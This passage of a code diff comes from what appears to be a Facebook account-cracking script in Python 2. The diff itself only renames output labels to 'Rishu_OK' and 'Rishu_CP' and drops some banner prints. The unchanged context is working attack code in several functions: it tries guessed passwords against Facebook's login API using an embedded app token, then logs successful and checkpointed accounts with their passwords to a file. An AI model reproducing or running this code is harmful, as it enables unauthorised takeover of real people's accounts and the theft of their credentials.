                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
+                    print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
+                    print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                     cek = open('output/cp.txt', 'a')
                     cek.write(user + '|' + pass2 + '\n')
                     cek.close()
@@ -553,10 +554,10 @@ def pilih_duper():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
+                        print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
+                        print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                         cek = open('output/cp.txt', 'a')
                         cek.write(user + '|' + pass3 + '\n')
                         cek.close()
@@ -566,10 +567,10 @@ def pilih_duper():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
+                            print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
+                            print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                             cek = open('output/cp.txt', 'a')
                             cek.write(user + '|' + pass4 + '\n')
                             cek.close()
@@ -579,10 +580,10 @@ def pilih_duper():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
+                                print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
+                                print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                 cek = open('output/cp.txt', 'a')
                                 cek.write(user + '|' + pass5 + '\n')
                                 cek.close()
@@ -592,10 +593,10 @@ def pilih_duper():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
+                                    print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
+                                    print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                     cek = open('output/cp.txt', 'a')
                                     cek.write(user + '|' + pass6 + '\n')
                                     cek.close()
@@ -605,10 +606,10 @@ def pilih_duper():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
+                                        print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                         oks.append(user + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
+                                        print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                         cek = open('output/cp.txt', 'a')
                                         cek.write(user + '|' + pass7 + '\n')
                                         cek.close()
@@ -621,8 +622,6 @@ def pilih_duper():
     print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
     print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
     print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
-    print logo4
-    print '\n\t\t\x1b[1;33;40m\n\n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
     raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
     menu()
 
@@ -731,10 +730,10 @@ def pilih_buper():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
+                print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
+                print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                 cek = open('output/cp.txt', 'a')
                 cek.write(user + '|' + pass1 + '\n')
                 cek.close()
@@ -744,10 +743,10 @@ def pilih_buper():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
+                    print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
+                    print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                     cek = open('output/cp.txt', 'a')
                     cek.write(user + '|' + pass2 + '\n')
                     cek.close()
@@ -757,10 +756,10 @@ def pilih_buper():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
+                        print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
+                        print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                         cek = open('output/cp.txt', 'a')
                         cek.write(user + '|' + pass3 + '\n')
                         cek.close()
@@ -770,10 +769,10 @@ def pilih_buper():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
+                            print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
+                            print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                             cek = open('output/cp.txt', 'a')
                             cek.write(user + '|' + pass4 + '\n')
                             cek.close()
@@ -783,10 +782,10 @@ def pilih_buper():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
+                                print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
+                                print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                 cek = open('output/cp.txt', 'a')
                                 cek.write(user + '|' + pass5 + '\n')
                                 cek.close()
@@ -796,10 +795,10 @@ def pilih_buper():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
+                                    print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
+                                    print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                     cek = open('output/cp.txt', 'a')
                                     cek.write(user + '|' + pass6 + '\n')
                                     cek.close()
@@ -809,10 +808,10 @@ def pilih_buper():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
+                                        print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                         oks.append(user + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
+                                        print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                         cek = open('output/cp.txt', 'a')
                                         cek.write(user + '|' + pass7 + '\n')
                                         cek.close()
@@ -825,8 +824,6 @@ def pilih_buper():
     print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
     print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
     print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
-    print logo5
-    print '\n\t\t\x1b[1;33;40m\n\n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
     raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
     menu()
 
@@ -935,10 +932,10 @@ def pilih_super():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
+                print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
+                print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                 cek = open('output/cp.txt', 'a')
                 cek.write(user + '|' + pass1 + '\n')
                 cek.close()
@@ -948,10 +945,10 @@ def pilih_super():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
+                    print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
+                    print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                     cek = open('output/cp.txt', 'a')
                     cek.write(user + '|' + pass2 + '\n')
                     cek.close()
@@ -961,10 +958,10 @@ def pilih_super():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
+                        print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
+                        print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                         cek = open('output/cp.txt', 'a')
                         cek.write(user + '|' + pass3 + '\n')
                         cek.close()
@@ -974,10 +971,10 @@ def pilih_super():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
+                            print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
+                            print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                             cek = open('output/cp.txt', 'a')
                             cek.write(user + '|' + pass4 + '\n')
                             cek.close()
@@ -987,10 +984,10 @@ def pilih_super():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
+                                print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
+                                print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                 cek = open('output/cp.txt', 'a')
                                 cek.write(user + '|' + pass5 + '\n')
                                 cek.close()
@@ -1000,10 +997,10 @@ def pilih_super():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
+                                    print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
+                                    print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                     cek = open('output/cp.txt', 'a')
                                     cek.write(user + '|' + pass6 + '\n')
                                     cek.close()
@@ -1013,10 +1010,10 @@ def pilih_super():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
+                                        print '\x1b[1;92m[Rishu_OK] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                         oks.append(user + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
+                                        print '\x1b[1;36;40m[Rishu_CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                         cek = open('output/cp.txt', 'a')
                                         cek.write(user + '|' + pass7 + '\n')
                                         cek.close()
@@ -1029,8 +1026,6 @@ def pilih_super():
     print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
     print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
     print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
-    print logo4
-    print '\n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
     raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
     menu()
 
